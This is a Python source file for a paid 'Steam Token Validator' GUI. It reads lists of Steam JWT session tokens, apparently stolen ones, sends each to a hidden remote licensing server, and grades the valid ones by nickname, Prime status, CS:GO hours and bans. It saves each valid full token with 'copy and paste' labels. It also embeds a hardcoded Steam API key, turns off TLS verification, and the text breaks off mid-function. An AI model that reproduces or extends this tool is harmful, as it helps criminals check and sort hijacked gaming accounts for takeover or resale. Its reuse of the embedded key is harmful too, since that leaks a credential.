import base64
import hashlib
import hmac
import json
import os
import socket
import sys
import threading
import time
from datetime import datetime, timezone
from typing import List, Tuple, Optional

import requests
import urllib3
import jwt
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry


# Use current directory where the script is executed
BASE_DIR = os.getcwd()
RESULT_PATH = os.path.join(BASE_DIR, "Results.txt")
SESSION_PATH = os.path.join(BASE_DIR, "session.bin")
CLIENT_KEY_PATH = os.path.join(BASE_DIR, "client_api_key.txt")
CLIENT_CONFIG_PATH = os.path.join(BASE_DIR, "client_config.json")
SERVER_IP_DEFAULT = "web-production-f5f3.up.railway.app"  # URL pública do Railway
SERVER_PORT_DEFAULT = 80


def ensure_base_dir() -> None:
    # BASE_DIR is now current directory, no need to create it
    pass


def utcnow_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def read_tokens_file(path: str) -> List[str]:
    try:
        with open(path, "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f.readlines()]
        return [x for x in lines if x]
    except Exception:
        return []


def write_result_line(line: str) -> None:
    try:
        with open(RESULT_PATH, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass


def clear_result_file() -> None:
    """Clear the result file at startup"""
    try:
        with open(RESULT_PATH, "w", encoding="utf-8") as f:
            f.write("")  # Clear file
    except Exception:
        pass


def print_and_save(text: str) -> None:
    """Print to console and save to file simultaneously"""
    print(text)
    write_result_line(text)


def append_valid_token_block(steam_id: str, nickname: str, prime_status: str, token: str) -> None:
    # Writes the requested block-only format for valid tokens
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    lines = [
        "🎮 Token Steam Válido Encontrado!",
        "Steam ID",
        steam_id or "Desconhecido",
        "Nickname",
        nickname or "Desconhecido",
        "Prime Status",
        prime_status or "Desconhecido",
        "Token Completo (Copie e Cole)",
        token,
        f"Validado em: {ts}",
    ]
    try:
        with open(RESULT_PATH, "a", encoding="utf-8") as f:
            for l in lines:
                f.write(l + "\n")
    except Exception:
        pass


def decode_jwt_sub(steam_token: str) -> Optional[str]:
    try:
        parts = steam_token.split(".")
        if len(parts) < 2:
            return None
        payload_b64 = parts[1]
        # fix padding for base64url
        padding = '=' * (-len(payload_b64) % 4)
        payload_json = base64.urlsafe_b64decode(payload_b64 + padding).decode("utf-8", errors="ignore")
        data = json.loads(payload_json)
        sub = str(data.get("sub", "")).strip()
        return sub or None
    except Exception:
        return None



def get_steam_bans(steam_id: str) -> Tuple[bool, str, str]:
    """
    Verifica status de banimentos (VAC, Game, Community, Economy) via GetPlayerBans.
    Docs: https://partner.steamgames.com/doc/webapi/ISteamUser#GetPlayerBans
    """
    try:
        steam_api_key = "812A1C32ED9A028C140DBEF127DBCE9B"
        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        url = f"https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/"
        params = {
            'key': steam_api_key,
            'steamids': steam_id
        }
        resp = session.get(url, params=params, headers=headers, timeout=10, verify=False)
        if resp.status_code != 200:
            return False, "Erro", f'HTTP {resp.status_code}'
        data = resp.json() or {}
        players = data.get('players', [])
        if not players:
            return False, "Erro", 'No data'
        p = players[0]
        vac_banned = bool(p.get('VACBanned', False))
        num_vac = int(p.get('NumberOfVACBans', 0))
        num_game = int(p.get('NumberOfGameBans', 0))
        days_last = int(p.get('DaysSinceLastBan', 0))
        community_banned = bool(p.get('CommunityBanned', False))
        economy_ban = str(p.get('EconomyBan', 'none'))

        # Monta texto amigável
        parts = []
        if vac_banned:
            parts.append(f"VAC (permanente), {num_vac} ban(s), último há {days_last}d")
        if num_game > 0:
            parts.append(f"Game ban: {num_game}")
        if community_banned:
            parts.append("Community ban")
        if economy_ban and economy_ban.lower() != 'none':
            parts.append(f"Economy ban: {economy_ban}")
        if not parts:
            parts.append("Sem bans")

        ban_text = '; '.join(parts)
        has_bans = vac_banned or num_game > 0 or community_banned or (economy_ban and economy_ban.lower() != 'none')
        return has_bans, "Com bans" if has_bans else "Limpo", ban_text
    except Exception as e:
        return False, "Erro", f'Erro ao obter bans: {str(e)}'


# =============== HWID Calculation ===============
def get_platform_node() -> str:
    try:
        return socket.gethostname()
    except Exception:
        return "unknown-node"


def get_mac_addresses() -> List[str]:
    macs: List[str] = []
    try:
        import uuid
        mac_int = uuid.getnode()
        if (mac_int >> 40) % 2 == 0:  # Valid MAC
            macs.append(":".join(f"{(mac_int >> ele) & 0xff:02x}" for ele in range(40, -1, -8)))
    except Exception:
        pass
    return macs


def get_wmi_serials_windows() -> List[str]:
    serials: List[str] = []
    if os.name != "nt":
        return serials
    try:
        import subprocess
        for cmd in [
            ["wmic", "bios", "get", "serialnumber"],
            ["wmic", "baseboard", "get", "serialnumber"],
            ["wmic", "diskdrive", "get", "serialnumber"],
        ]:
            try:
                out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, text=True, timeout=5)
                for line in out.splitlines():
                    s = line.strip()
                    if s and s.lower() != "serialnumber":
                        serials.append(s)
            except Exception:
                continue
    except Exception:
        pass
    return serials


def compute_local_hwid(secret: bytes = b"steamvalidator-hwid") -> str:
    parts: List[str] = []
    parts.append(get_platform_node())
    parts.extend(get_mac_addresses())
    parts.extend(get_wmi_serials_windows())
    base = "|".join(parts)
    digest = hmac.new(secret, base.encode("utf-8", errors="ignore"), hashlib.sha256).hexdigest()
    return digest


# =============== Session Encryption (lightweight) ===============
def derive_key() -> bytes:
    # Derive a local key from machine HWID so session file is not trivially readable
    hwid = compute_local_hwid().encode("utf-8")
    return hashlib.sha256(b"session-key:" + hwid).digest()


def encrypt_session(data: bytes) -> bytes:
    key = derive_key()
    out = bytearray()
    for i, b in enumerate(data):
        out.append(b ^ key[i % len(key)])
    return bytes(out)


def save_session(server_ip: str, server_port: int, username: str = "") -> None:
    payload = {
        "last_run": utcnow_iso(),
        "server_ip": server_ip,
        "server_port": server_port,
        "username": username,
    }
    raw = json.dumps(payload).encode("utf-8")
    enc = encrypt_session(raw)
    with open(SESSION_PATH, "wb") as f:
        f.write(enc)


def load_session_username() -> str:
    try:
        with open(SESSION_PATH, "rb") as f:
            enc = f.read()
        raw = encrypt_session(enc)
        data = json.loads(raw.decode("utf-8"))
        u = str(data.get("username", "")).strip()
        return u
    except Exception:
        return ""


def read_or_create_client_config() -> tuple[str, int]:
    try:
        if not os.path.isfile(CLIENT_CONFIG_PATH):
            # Default to Railway server
            with open(CLIENT_CONFIG_PATH, "w", encoding="utf-8") as f:
                json.dump({"server_ip": SERVER_IP_DEFAULT, "server_port": SERVER_PORT_DEFAULT}, f, indent=2)
            return SERVER_IP_DEFAULT, SERVER_PORT_DEFAULT
        with open(CLIENT_CONFIG_PATH, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        ip = str(cfg.get("server_ip", SERVER_IP_DEFAULT))
        port = int(cfg.get("server_port", SERVER_PORT_DEFAULT))
        return ip, port
    except Exception:
        return SERVER_IP_DEFAULT, SERVER_PORT_DEFAULT


# =============== Simple Login GUI ===============
class LoginDialog:
    def __init__(self, title: str = "Login"):
        self.username: str = ""
        self.license_key: str = ""
        self._closed = False
        self.root = tk.Tk()
        self.root.title(title)
        self.root.geometry("320x160")
        self.root.resizable(False, False)

        frm = ttk.Frame(self.root, padding=10)
        frm.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frm, text="Username:").grid(row=0, column=0, sticky="w")
        self.ent_user = ttk.Entry(frm, width=28)
        self.ent_user.grid(row=0, column=1, sticky="w")

        ttk.Label(frm, text="License Key:").grid(row=1, column=0, sticky="w", pady=(8,0))
        self.ent_key = ttk.Entry(frm, width=28, show="*")
        self.ent_key.grid(row=1, column=1, sticky="w", pady=(8,0))

        btns = ttk.Frame(frm)
        btns.grid(row=2, column=0, columnspan=2, pady=12)
        ttk.Button(btns, text="OK", command=self._ok).pack(side=tk.LEFT, padx=6)
        ttk.Button(btns, text="Cancelar", command=self._cancel).pack(side=tk.LEFT, padx=6)

        self.root.protocol("WM_DELETE_WINDOW", self._cancel)

    def _ok(self) -> None:
        self.username = self.ent_user.get().strip()
        self.license_key = self.ent_key.get().strip()
        self._closed = True
        self.root.destroy()

    def _cancel(self) -> None:
        self.username = ""
        self.license_key = ""
        self._closed = True
        self.root.destroy()

    def show(self) -> Tuple[str, str]:
        self.root.mainloop()
        return self.username, self.license_key


class StartDialog:
    def __init__(self, initial_username: str = "", server_ip: str = SERVER_IP_DEFAULT, server_port: int = SERVER_PORT_DEFAULT):
        self.result = None
        self.root = tk.Tk()
        self.root.title("SteamValidator")
        self.root.geometry("420x280")
        self.root.resizable(False, False)

        frm = ttk.Frame(self.root, padding=10)
        frm.pack(fill=tk.BOTH, expand=True)

        # Server
        # Fixed server (user does not change) - hidden from user
        # ttk.Label(frm, text="Server:").grid(row=0, column=0, sticky="w")
        # self.lbl_server = ttk.Label(frm, text=f"{server_ip}:{server_port}")
        # self.lbl_server.grid(row=0, column=1, columnspan=3, sticky="w")

        # Credentials
        ttk.Label(frm, text="Username:").grid(row=0, column=0, sticky="w", pady=(8,0))
        self.ent_user = ttk.Entry(frm, width=24)
        if initial_username:
            self.ent_user.insert(0, initial_username)
        self.ent_user.grid(row=0, column=1, sticky="w", pady=(8,0))

        ttk.Label(frm, text="License Key:").grid(row=1, column=0, sticky="w", pady=(8,0))
        self.ent_key = ttk.Entry(frm, width=24, show="*")
        self.ent_key.grid(row=1, column=1, sticky="w", pady=(8,0))

        # Tokens file
        ttk.Label(frm, text="tokens.txt:").grid(row=2, column=0, sticky="w", pady=(8,0))
        self.ent_tokens = ttk.Entry(frm, width=30)
        # Prefill with default tokens.txt near script
        try:
            default_tokens = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "tokens.txt")
        except Exception:
            default_tokens = "tokens.txt"
        self.ent_tokens.insert(0, default_tokens)
        self.ent_tokens.grid(row=2, column=1, columnspan=2, sticky="we", pady=(8,0))
        ttk.Button(frm, text="Procurar", command=self._browse_tokens).grid(row=2, column=3, sticky="w", pady=(8,0))

        # Mode
        ttk.Label(frm, text="Modo:").grid(row=3, column=0, sticky="w", pady=(8,0))
        self.mode_var = tk.StringVar(value="single-run")
        ttk.Combobox(frm, textvariable=self.mode_var, values=["single-run", "monitor"], width=20, state="readonly").grid(row=3, column=1, sticky="w", pady=(8,0))

        ttk.Label(frm, text="Interval (s):").grid(row=3, column=2, sticky="w", padx=(10,0), pady=(8,0))
        self.ent_interval = ttk.Entry(frm, width=8)
        self.ent_interval.insert(0, "10")
        self.ent_interval.grid(row=3, column=3, sticky="w", pady=(8,0))

        # Buttons
        btns = ttk.Frame(frm)
        btns.grid(row=4, column=0, columnspan=4, pady=14)
        ttk.Button(btns, text="Login", command=lambda: self._ok("login")).pack(side=tk.LEFT, padx=6)
        ttk.Button(btns, text="Sair", command=self._cancel).pack(side=tk.LEFT, padx=6)

        self.root.protocol("WM_DELETE_WINDOW", self._cancel)

    def _browse_tokens(self) -> None:
        path = filedialog.askopenfilename(title="Selecionar tokens.txt", filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if path:
            self.ent_tokens.delete(0, tkEND := 0)  # silence type checkers
            self.ent_tokens.delete(0, tk.END)
            self.ent_tokens.insert(0, path)

    def _ok(self, action: str) -> None:
        try:
            interval = int(self.ent_interval.get().strip())
        except Exception:
            interval = 10
        # Use fixed server values (hidden from user)
        si, sp = SERVER_IP_DEFAULT, SERVER_PORT_DEFAULT
        self.result = {
            "server_ip": si,
            "server_port": sp,
            "username": self.ent_user.get().strip(),
            "license_key": self.ent_key.get().strip(),
            "tokens_path": self.ent_tokens.get().strip(),
            "mode": self.mode_var.get().strip(),
            "interval": interval,
            "action": action,
        }
        self.root.destroy()

    def _cancel(self) -> None:
        self.result = None
        self.root.destroy()

    def show(self):
        self.root.mainloop()
        return self.result


# =============== Client Logic ===============
def read_client_api_key() -> Tuple[bool, str]:
    try:
        with open(CLIENT_KEY_PATH, "r", encoding="utf-8") as f:
            return True, f.read().strip()
    except Exception:
        return False, ""


def bootstrap_client_api_key(server_ip: str, port: int) -> Tuple[bool, str]:
    if server_ip.startswith("http"):
        url = f"{server_ip}/api/public/server_api_key"
    else:
        url = f"https://{server_ip}/api/public/server_api_key"
    try:
        r = requests.get(url, timeout=10)
        data = r.json() if r.headers.get("content-type", "").lower().startswith("application/json") else {}
        api_key = str(data.get("server_api_key", ""))
        if not api_key:
            return False, ""
        # Save in current directory (no need to create directory)
        with open(CLIENT_KEY_PATH, "w", encoding="utf-8") as f:
            f.write(api_key)
        return True, api_key
    except Exception:
        return False, ""


def post_validate(server_ip: str, port: int, api_key: str, license_key: str, hwid: str, username: str, steam_token: str) -> Tuple[bool, int, dict, str]:
    if server_ip.startswith("http"):
        url = f"{server_ip}/api/validate"
    else:
        url = f"https://{server_ip}/api/validate"
    try:
        r = requests.post(
            url,
            json={"token": license_key, "hwid": hwid, "username": username, "steam_token": steam_token},
            headers={"X-Api-Key": api_key},
            timeout=15,
        )
        try:
            body = r.json()
        except Exception:
            body = {"raw": r.text}
        return True, r.status_code, body, ""
    except Exception as e:
        return False, 0, {}, str(e)


def post_auth(server_ip: str, port: int, api_key: str, endpoint: str, username: str, license_key: str, hwid: str) -> Tuple[bool, int, dict, str]:
    if server_ip.startswith("http"):
        url = f"{server_ip}{endpoint}"
    else:
        url = f"https://{server_ip}{endpoint}"
    try:
        r = requests.post(url, json={"username": username, "license_key": license_key, "hwid": hwid}, headers={"X-Api-Key": api_key}, timeout=15)
        try:
            body = r.json()
        except Exception:
            body = {"raw": r.text}
        return True, r.status_code, body, ""
    except Exception as e:
        return False, 0, {}, str(e)


def sha256_short(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8", errors="ignore")).hexdigest()[:16]




def validate_tokens_once(server_ip: str, port: int, tokens_path: str, username: str, license_key: str, api_key: str) -> None:
    ensure_base_dir()
    
    hwid = compute_local_hwid()
    tokens_list = read_tokens_file(tokens_path)
    if not tokens_list:
        print(f"Erro: arquivo de tokens vazio ou não encontrado: {tokens_path}")
        save_session(server_ip, port, username)
        return

    print(f"\n➡️ Iniciando validação de {len(tokens_list)} tokens...\n")
    
    valid_count = 0
    invalid_count = 0
    error_count = 0
    
    for idx, token in enumerate(tokens_list, 1):
        try:
            print(f"[{idx}/{len(tokens_list)}] Validando token...")
            
            ok_req, status, body, err = post_validate(server_ip, port, api_key, license_key, hwid, username, token)
            if not ok_req:
                print(f"  ❌ Erro de conexão: {err}")
                error_count += 1
                continue
            
            try:
                j = json.dumps(body, separators=(",", ":"))
            except Exception:
                j = str(body)
            
            status_txt = "OK" if body.get("valid") else ("FAIL" if status < 500 else "ERROR")
            reason = body.get("reason", f"http_{status}")
            
            if status_txt == "OK":
                steam_id = decode_jwt_sub(token) or "Desconhecido"
                print(f"  ✅ Token válido! Steam ID: {steam_id}")
                
                # Get Steam user info (nickname and prime status) - this takes time
                try:
                    steam_api_key = "812A1C32ED9A028C140DBEF127DBCE9B"
                    
                    # Obtém informações do jogador
                    player_info = get_player_info(steam_id, steam_api_key)
                    nickname = player_info.get('nickname', 'Desconhecido')
                    
                    # Verifica status Prime (com métodos alternativos)
                    prime_info = check_prime_status(steam_id, steam_api_key)
                    prime_status = prime_info.get('prime_status', 'Desconhecido')
                    
                    # Attach hours if available
                    if 'csgo_hours' in prime_info and isinstance(prime_info['csgo_hours'], (int, float)):
                        prime_status = f"{prime_status} ({prime_info['csgo_hours']}h CS:GO)"
                    
                    # Verifica bans (VAC/Game/Community/Economy)
                    if steam_api_key:
                        bans = get_steam_bans(steam_id)
                        if len(bans) == 3:  # has_bans, ban_status, ban_details
                            has_bans, ban_status, ban_details = bans
                            if ban_details and ban_details != "Sem bans":
                                prime_status = f"{prime_status} | Bans: {ban_details}"
                            else:
                                prime_status = f"{prime_status} | Sem bans"
                    
                    print(f"      Nickname: {nickname}")
                    print(f"      Prime: {prime_status}")
                except Exception as e:
                    print(f"      Aviso: Não foi possível obter informações da Steam: {e}")
                    nickname = "Desconhecido"
                    prime_status = "Desconhecido"
                
                # Print token inline with the validation result
                print_and_save(f"      Token: {token}")
                # Save detailed token block with ban info
                append_valid_token_block(steam_id, nickname, prime_status, token)
                valid_count += 1
            else:
                print(f"  ❌ Token inválido: {reason}")
                invalid_count += 1
                
        except Exception as e:
            print(f"  ❌ Erro ao processar token: {e}")
            error_count += 1
            import traceback
            traceback.print_exc()
    
    print(f"\n{'='*50}")
    print(f"Validação concluída!")
    print(f"  ✅ Válidos: {valid_count}")
    print(f"  ❌ Inválidos: {invalid_count}")
    print(f"  ⚠️ Erros: {error_count}")
    print(f"{'='*50}\n")
    
    save_session(server_ip, port, username)


def monitor_tokens(server_ip: str, port: int, tokens_path: str, interval_sec: int, username: str, license_key: str, api_key: str) -> None:
    known_hashes = set()
    ensure_base_dir()
    hwid = compute_local_hwid()
    
    print(f"\n🔍 Modo monitor ativado. Verificando novos tokens a cada {interval_sec} segundos...\n")
    
    while True:
        tokens_list = read_tokens_file(tokens_path)
        new_tokens = []
        for t in tokens_list:
            h = sha256_short(t)
            if h not in known_hashes:
                known_hashes.add(h)
                new_tokens.append((t, h))
        
        if new_tokens:
            print(f"\n➡️ Encontrados {len(new_tokens)} novos tokens para validar...\n")
        
        for idx, (token, token_hash) in enumerate(new_tokens, 1):
            try:
                print(f"[{idx}/{len(new_tokens)}] Validando novo token...")
                
                ok_req, status, body, err = post_validate(server_ip, port, api_key, license_key, hwid, username, token)
                if not ok_req:
                    print(f"  ❌ Erro de conexão: {err}")
                    continue
                
                try:
                    j = json.dumps(body, separators=(",", ":"))
                except Exception:
                    j = str(body)
                
                status_txt = "OK" if body.get("valid") else ("FAIL" if status < 500 else "ERROR")
                reason = body.get("reason", f"http_{status}")
                
                if status_txt == "OK":
                    steam_id = decode_jwt_sub(token) or "Desconhecido"
                    print(f"  ✅ Token válido! Steam ID: {steam_id}")
                    
                    # Get Steam user info (nickname and prime status) - this takes time
                    try:
                        steam_api_key = "812A1C32ED9A028C140DBEF127DBCE9B"
                        
                        # Obtém informações do jogador
                        player_info = get_player_info(steam_id, steam_api_key)
                        nickname = player_info.get('nickname', 'Desconhecido')
                        
                        # Verifica status Prime (com métodos alternativos)
                        prime_info = check_prime_status(steam_id, steam_api_key)
                        prime_status = prime_info.get('prime_status', 'Desconhecido')
                        
                        # Attach hours if available
                        if 'csgo_hours' in prime_info and isinstance(prime_info['csgo_hours'], (int, float)):
                            prime_status = f"{prime_status} ({prime_info['csgo_hours']}h CS:GO)"
                        
                        # Verifica bans (VAC/Game/Community/Economy)
                        if steam_api_key:
                            bans = get_steam_bans(steam_id)
                            if len(bans) == 3:  # has_bans, ban_status, ban_details
                                has_bans, ban_status, ban_details = bans
                                if ban_details and ban_details != "Sem bans":
                                    prime_status = f"{prime_status} | Bans: {ban_details}"
                                else:
                                    prime_status = f"{prime_status} | Sem bans"
                        
                        print(f"      Nickname: {nickname}")
                        print(f"      Prime: {prime_status}")
                    except Exception as e:
                        print(f"      Aviso: Não foi possível obter informações da Steam: {e}")
                        nickname = "Desconhecido"
                        prime_status = "Desconhecido"
                    
                    # Print token inline with the validation result
                    print_and_save(f"      Token: {token}")
                    # Save detailed token block with ban info
                    append_valid_token_block(steam_id, nickname, prime_status, token)
                else:
                    print(f"  ❌ Token inválido: {reason}")
                    
            except Exception as e:
                print(f"  ❌ Erro ao processar token: {e}")
                import traceback
                traceback.print_exc()
            
            save_session(server_ip, port, username)
        
        time.sleep(interval_sec)


def main() -> None:
    # Usage:
    # python steamvalidator.py single-run <SERVER_IP> <PORT> <tokens.txt>
    # python steamvalidator.py monitor <SERVER_IP> <PORT> <tokens.txt> [interval_sec]
    if True:
        # Clear result file at startup
        clear_result_file()
        print("=== Steam Token Validator ===")
        print("Validador para tokens Steam JWT")
        print(f"📁 Salvando resultados em: {RESULT_PATH}")
        print()
        # GUI flow
        initial_user = load_session_username()
        ip_cfg, port_cfg = read_or_create_client_config()
        dlg = StartDialog(initial_user, ip_cfg, port_cfg)
        cfg = dlg.show()
        if not cfg:
            print("Sistema encerrado pelo usuário.")
            sys.exit(0)
        if not cfg["username"] or not cfg["license_key"]:
            print("Erro: username ou license key vazios.")
            print("Sistema encerrado por segurança.")
            sys.exit(1)
        # Save username for next runs
        save_session(cfg["server_ip"], cfg["server_port"], cfg["username"])
        # Perform register/login first
        ok, api_key = read_client_api_key()
        if not ok or not api_key:
            # Try to fetch from server automatically
            b_ok, api_key = bootstrap_client_api_key(cfg["server_ip"], cfg["server_port"])
            if not b_ok or not api_key:
                print("Erro: client_api_key ausente e não foi possível obter do servidor.")
                print("Sistema encerrado por segurança.")
                sys.exit(1)
        hwid = compute_local_hwid()
        endpoint = "/api/login"  # Only login, no register
        ok_req, status, body, err = post_auth(cfg["server_ip"], cfg["server_port"], api_key, endpoint, cfg["username"], cfg["license_key"], hwid)
        if not ok_req:
            print(f"Erro: servidor indisponível: {err}")
            print("Sistema encerrado por segurança.")
            sys.exit(1)
        if not isinstance(body, dict) or not body.get("ok"):
            reason = body.get("reason") if isinstance(body, dict) else str(body)
            print(f"Login falhou: {reason}")
            print("Sistema encerrado por segurança.")
            sys.exit(1)
        mode = cfg["mode"].lower()
        if mode == "single-run":
            validate_tokens_once(cfg["server_ip"], cfg["server_port"], cfg["tokens_path"], cfg["username"], cfg["license_key"], api_key)
        elif mode == "monitor":
            monitor_tokens(cfg["server_ip"], cfg["server_port"], cfg["tokens_path"], int(cfg["interval"]), cfg["username"], cfg["license_key"], api_key)
        
        print("\nPressione Enter para sair...")
        input()
        return
    # unreachable CLI flow is removed to force GUI


if __name__ == "__main__":
    main()

# Desabilita warnings de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Webhooks do Discord (desativados)
DISCORD_WEBHOOK = None
PRIME_DISCORD_WEBHOOK = None
POSSIBLE_PRIME_WEBHOOK = None

def is_token_expired(decoded_token):
    """Verifica se o token está expirado"""
    exp_time = decoded_token.get('exp', 0)
    current_time = int(time.time())
    return current_time > exp_time

def validate_token_with_steam(token):
    """Valida o token usando o endpoint correto da Steam"""
    try:
        # Configura sessão
        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        }
        
        # Usa o endpoint correto para validar tokens Steam
        url = f"https://api.steampowered.com/ISteamUserOAuth/GetTokenDetails/v1/"
        params = {'access_token': token}
        
        response = session.get(url, params=params, headers=headers, timeout=10, verify=True)
        
        if response.status_code == 200:
            data = response.json()
            if 'response' in data and 'steamid' in data['response']:
                return {
                    'status': 'Valid',
                    'steam_id': data['response']['steamid'],
                    'token_valid': True
                }
            else:
                return {'status': 'Invalid Token', 'token_valid': False}
        elif response.status_code == 401:
            return {'status': 'Unauthorized - Token inválido ou expirado', 'token_valid': False}
        elif response.status_code == 403:
            return {'status': 'Forbidden - Token sem permissões', 'token_valid': False}
        else:
            return {'status': f'Error: HTTP {response.status_code}', 'token_valid': False}
    except requests.exceptions.Timeout:
        return {'status': 'Timeout - Servidor não respondeu', 'token_valid': False}
    except requests.exceptions.SSLError:
        return {'status': 'Erro SSL - Problema de certificado', 'token_valid': False}
    except requests.exceptions.ConnectionError:
        return {'status': 'Erro de conexão - Verifique sua internet', 'token_valid': False}
    except Exception as e:
        return {'status': f'Erro: {str(e)}', 'token_valid': False}

def get_player_info(steam_id, steam_api_key=None):
    """Obtém informações do jogador usando a API Steam"""
    if not steam_api_key:
        return {
            'nickname': 'Unknown (API Key necessária)',
            'profile_url': 'Unknown (API Key necessária)',
            'avatar': 'Unknown (API Key necessária)',
            'country_code': 'Unknown (API Key necessária)'
        }
    
    try:
        # Configura sessão com retry
        session = requests.Session()
        retry_strategy = Retry(
            total=2,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504],
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        url = f"https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/"
        params = {
            'key': steam_api_key,
            'steamids': steam_id
        }
        
        response = session.get(url, params=params, headers=headers, timeout=15, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            players = data.get('response', {}).get('players', [])
            
            if players:
                player = players[0]
                return {
                    'nickname': player.get('personaname', 'Unknown'),
                    'profile_url': player.get('profileurl', 'Unknown'),
                    'avatar': player.get('avatar', 'Unknown'),
                    'country_code': player.get('loccountrycode', 'Unknown'),
                    'real_name': player.get('realname', 'Unknown'),
                    'persona_state': player.get('personastate', 'Unknown')
                }
            else:
                return {'nickname': 'Player not found', 'error': 'No player data returned'}
        else:
            return {'error': f'HTTP {response.status_code}: {response.text}'}
    except Exception as e:
        return {'error': f'Erro ao obter informações do jogador: {str(e)}'}

def check_prime_status(steam_id, steam_api_key=None):
    """Verifica o status Prime da conta usando múltiplos métodos"""
    if not steam_api_key:
        return {'prime_status': 'Unknown (API Key necessária)'}
    
    # Método 1: API oficial da Steam
    try:
        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Tenta o endpoint oficial primeiro
        url = f"https://api.steampowered.com/IPlayerService/IsAccountPrimeStatus/v1/"
        params = {
            'key': steam_api_key,
            'steamid': steam_id
        }
        
        response = session.get(url, params=params, headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            prime_status = data.get('response', {}).get('prime_status', False)
            return {'prime_status': prime_status}
        elif response.status_code == 404:
            # Se 404, tenta método alternativo
            return check_prime_alternative(steam_id, steam_api_key)
        else:
            return {'prime_status': f'Error: HTTP {response.status_code}'}
    except Exception as e:
        return {'prime_status': f'Erro: {str(e)}'}

def check_prime_alternative(steam_id, steam_api_key):
    """Verifica Prime baseado nas horas jogadas"""
    try:
        # Verifica horas jogadas no CS:GO
        hours_info = get_csgo_hours(steam_id, steam_api_key)
        
        if 'error' in hours_info:
            return {'prime_status': f'Erro ao verificar horas: {hours_info["error"]}'}
        
        total_hours = hours_info.get('total_hours', 0)
        
        if total_hours >= 200:
            return {'prime_status': 'Prime (200h+)', 'csgo_hours': total_hours}
        elif total_hours >= 20:
            return {'prime_status': 'Possível Prime (20-200h)', 'csgo_hours': total_hours}
        else:
            return {'prime_status': 'Não Prime (<20h)', 'csgo_hours': total_hours}
            
    except Exception as e:
        return {'prime_status': f'Erro alternativo: {str(e)}'}

def get_csgo_hours(steam_id, steam_api_key):
    """Obtém horas jogadas no CS:GO"""
    try:
        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # CS:GO App ID é 730
        url = f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/"
        params = {
            'key': steam_api_key,
            'steamid': steam_id,
            'include_appinfo': True,
            'include_played_free_games': True
        }
        
        response = session.get(url, params=params, headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            data = response.json()
            games = data.get('response', {}).get('games', [])
            
            # Procura CS:GO (App ID: 730)
            for game in games:
                if game.get('appid') == 730:  # CS:GO
                    playtime_forever = game.get('playtime_forever', 0)
                    # Converte minutos para horas
                    hours = playtime_forever / 60
                    return {
                        'total_hours': round(hours, 1),
                        'playtime_minutes': playtime_forever,
                        'game_name': game.get('name', 'Counter-Strike: Global Offensive')
                    }
            
            return {'total_hours': 0, 'error': 'CS:GO não encontrado na biblioteca'}
        else:
            return {'error': f'HTTP {response.status_code}'}
            
    except Exception as e:
        return {'error': f'Erro ao obter horas: {str(e)}'}

def check_prime_steamdb(steam_id):
    """Verifica Prime usando SteamDB (método não oficial)"""
    try:
        session = requests.Session()
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # SteamDB pode ter informações sobre Prime
        url = f"https://steamdb.info/player/{steam_id}/"
        response = session.get(url, headers=headers, timeout=10, verify=False)
        
        if response.status_code == 200:
            content = response.text.lower()
            if 'prime' in content:
                return {'prime_status': 'Detectado via SteamDB'}
            else:
                return {'prime_status': 'Não detectado via SteamDB'}
        else:
            return {'prime_status': 'SteamDB inacessível'}
            
    except Exception as e:
        return {'prime_status': f'Erro SteamDB: {str(e)}'}



def send_to_discord(token_data):
    """Desativado: não envia mais para Discord"""
    return False

def process_tokens(input_file, output_file, steam_api_key=None):
    """Processa tokens de um arquivo de entrada"""
    results = []
    
    try:
        with open(input_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        total_lines = len(lines)
        print(f"Encontrados {total_lines} tokens para processar")
        
        for i, line in enumerate(lines, 1):
            line = line.strip()
            if not line:
                continue
            
            try:
                # Separa o ID da conta e o token
                if '----' in line:
                    account_id, token = line.split('----', 1)
                else:
                    account_id = f"token_{i}"
                    token = line
                
                print(f"[{i}/{total_lines}] Processando: {account_id}")
                
                # Decodifica o token JWT
                try:
                    decoded_token = jwt.decode(token, options={"verify_signature": False})
                except Exception as e:
                    result = {
                        'account_id': account_id,
                        'token': token[:50] + "..." if len(token) > 50 else token,
                        'status': 'Error',
                        'details': f'Falha ao decodificar token JWT: {str(e)}',
        'timestamp': datetime.now().isoformat()
                    }
                    results.append(result)
                    print(f"  ✗ Erro ao decodificar token")
                    continue
                
                # Verifica se o token está expirado
                if is_token_expired(decoded_token):
                    exp_time = datetime.fromtimestamp(decoded_token['exp'])
